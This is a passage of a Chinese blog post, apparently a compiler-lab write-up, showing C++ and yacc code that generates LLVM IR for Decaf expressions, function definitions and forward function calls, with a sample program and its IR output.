class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">case</span> sgetmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSGE(L, R, <span class="string">&quot;sgetmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> shltmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateShl(L, R, <span class="string">&quot;shltmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">            <span class="keyword">case</span> shrtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateLShr(L, R, <span class="string">&quot;shrtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;                          </span><br><span class="line">            <span class="keyword">default</span>: </span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == funcK)&#123;</span><br><span class="line">        decafFunCall * call = (decafFunCall *)<span class="keyword">this</span>; </span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = call-&gt;Codegen();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其实就是把对 decafAllexp decafBinexp decafUnaryexp 的处理都整合到了 <code>decafBinexp::Codegen</code> 上</li>
<li>最后一个函数调用的处理其实是特殊情况，我为了方便就直接把它放到这个地方了</li>
<li>对于 “语句Stmt” 的处理也可以使用上述思路（本实验没有要求处理 “语句Stmt”）</li>
</ul>
<p>参考以下案例：对于函数定义和函数调用的处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> func <span class="title">print_int</span><span class="params">(<span class="keyword">int</span>)</span> <span class="keyword">void</span></span>;</span><br><span class="line"></span><br><span class="line">package Test &#123;</span><br><span class="line">    <span class="function">func <span class="title">main</span><span class="params">()</span> <span class="keyword">int</span> </span>&#123;</span><br><span class="line">        test(<span class="number">10</span>, <span class="number">13</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">func <span class="title">test</span><span class="params">(a <span class="keyword">int</span>, b <span class="keyword">int</span>)</span> <span class="keyword">void</span> </span>&#123;</span><br><span class="line">        print_int(a);</span><br><span class="line">        print_int(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;Test&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;DecafExpr&quot;</span></span><br><span class="line"></span><br><span class="line">declare <span class="keyword">void</span> @print_int(i32)</span><br><span class="line"></span><br><span class="line">define i32 @main() &#123;</span><br><span class="line">entry:</span><br><span class="line">  call <span class="keyword">void</span> @test(i32 <span class="number">10</span>, i32 <span class="number">13</span>)</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define <span class="keyword">void</span> @test(i32 %a, i32 %b) &#123;</span><br><span class="line">entry:</span><br><span class="line">  %a1 = alloca i32</span><br><span class="line">  store i32 %a, i32* %a1</span><br><span class="line">  %b2 = alloca i32</span><br><span class="line">  store i32 %b, i32* %b2</span><br><span class="line">  %a3 = load i32, i32* %a1</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 %a3)</span><br><span class="line">  %b4 = load i32, i32* %b2</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 %b4)</span><br><span class="line">  ret <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个案例有一个特点：在定义 <code>test</code> 前，先在 <code>main</code> 中调用了 <code>test</code></li>
<li>为了实现这个效果，我将 “函数定义” 的相关操作拆为两部分，分别放入 <code>decafFuncDef::Codegen</code> 和 <code>method_decl</code> 中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">llvm::Value *<span class="title">decafFuncDef::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor* des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">    <span class="keyword">if</span>(check_symbol( <span class="keyword">this</span>-&gt;get_name(), funcK))&#123;</span><br><span class="line">        get_return = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        llvm::BasicBlock *BB = llvm::BasicBlock::Create(TheContext, <span class="string">&quot;entry&quot;</span>, <span class="keyword">this</span>-&gt;lfunc);</span><br><span class="line">        Builder.SetInsertPoint(BB);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> p:<span class="keyword">this</span>-&gt;get_para()-&gt;get_para())&#123;</span><br><span class="line">            <span class="keyword">this</span>-&gt;lfunc-&gt;getArg(i)-&gt;setName(p-&gt;get_name());</span><br><span class="line"></span><br><span class="line">            descriptor * des2 = <span class="keyword">new</span> descriptor();</span><br><span class="line">            <span class="keyword">if</span>(put_symbol(p-&gt;get_name(),des2))&#123;</span><br><span class="line">                des2-&gt;alloc = Builder.CreateAlloca(p-&gt;lType, <span class="number">0</span>, p-&gt;get_name());</span><br><span class="line">                des2-&gt;kind = valueK;</span><br><span class="line">            &#125;</span><br><span class="line">            Builder.CreateStore(<span class="keyword">this</span>-&gt;lfunc-&gt;getArg(i),des2-&gt;alloc);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        decafBlock * B = <span class="keyword">this</span>-&gt;get_block();</span><br><span class="line">        B-&gt;Codegen();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(get_return)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;lType-&gt;isVoidTy())</span><br><span class="line">                Builder.CreateRetVoid();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                Builder.CreateRet(llvm::ConstantInt::get(TheContext, llvm::APInt(<span class="number">32</span>, <span class="number">0</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;lfunc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">method_decl: T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type block &#123;</span><br><span class="line">        decafFuncDef *func = <span class="keyword">new</span> decafFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">4</span>;</span><br><span class="line">        decafBlock * block = (decafBlock*)$<span class="number">7</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">6</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">2</span>);</span><br><span class="line">        func-&gt;put_type(type);</span><br><span class="line">        func-&gt;put_para(para);</span><br><span class="line">        func-&gt;put_block(block);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        descriptor* des = <span class="keyword">new</span> descriptor();</span><br><span class="line">        <span class="keyword">if</span>(put_symbol( func-&gt;get_name(), des))&#123;</span><br><span class="line">            llvm::Type *returnTy = func-&gt;lType;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Type *&gt; functionArgs;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> p:func-&gt;get_para()-&gt;get_para())&#123;</span><br><span class="line">                functionArgs.push_back(p-&gt;lType);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            func-&gt;lfunc = llvm::Function::Create(</span><br><span class="line">                llvm::FunctionType::get(returnTy, functionArgs ,<span class="literal">false</span>),</span><br><span class="line">                llvm::Function::ExternalLinkage, </span><br><span class="line">                func-&gt;get_name(), </span><br><span class="line">                TheModule);</span><br><span class="line">            <span class="keyword">if</span> (func-&gt;lfunc == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> runtime_error(<span class="string">&quot;empty function block&quot;</span>); </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            des-&gt;func = func-&gt;lfunc;</span><br><span class="line">            des-&gt;kind = funcK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure>
<p>完整代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span 